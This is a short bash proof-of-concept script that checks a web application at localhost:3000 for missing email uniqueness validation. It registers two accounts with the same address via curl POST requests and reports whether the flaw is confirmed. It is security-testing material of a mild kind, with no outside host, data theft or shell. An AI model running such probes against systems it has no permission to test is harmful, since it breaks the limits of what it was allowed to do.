#!/bin/bash

# POC: Missing Email Uniqueness Validation - Duplicate Email Registration
# This script demonstrates the ability to create multiple user accounts with the same email address

TARGET="http://localhost:3000"
SHARED_EMAIL="duplicate_test_$(date +%s)@example.com"

echo "[*] Testing Email Uniqueness Validation"
echo "[*] Target: $TARGET"
echo "[*] Using shared email: $SHARED_EMAIL"
echo ""

# Step 1: Register first user with unique email
echo "[Step 1] Registering first user with email: $SHARED_EMAIL"
RESPONSE1=$(curl -s -X POST "$TARGET/register" \
  -d "username=email_user_1_$(date +%s)&password=test123&first_name=Test&last_name=User1&email=$SHARED_EMAIL" \
  -i)

HTTP_CODE1=$(echo "$RESPONSE1" | head -1 | awk '{print $2}')
echo "HTTP Response Code: $HTTP_CODE1"
if echo "$RESPONSE1" | grep -q "Location: /login"; then
  echo "✓ First registration successful (redirected to /login)"
else
  echo "✗ First registration failed"
fi
echo ""

# Step 2: Register second different user with SAME email
echo "[Step 2] Registering second user with SAME email: $SHARED_EMAIL"
RESPONSE2=$(curl -s -X POST "$TARGET/register" \
  -d "username=email_user_2_$(date +%s)&password=test123&first_name=Test&last_name=User2&email=$SHARED_EMAIL" \
  -i)

HTTP_CODE2=$(echo "$RESPONSE2" | head -1 | awk '{print $2}')
echo "HTTP Response Code: $HTTP_CODE2"
if echo "$RESPONSE2" | grep -q "Location: /login"; then
  echo "✓ Second registration successful (redirected to /login)"
  echo ""
  echo "[VULNERABILITY CONFIRMED] Multiple accounts created with identical email!"
  echo "Both users were successfully registered without email uniqueness validation."
  exit 0
else
  echo "✗ Second registration blocked/failed"
  exit 1
fi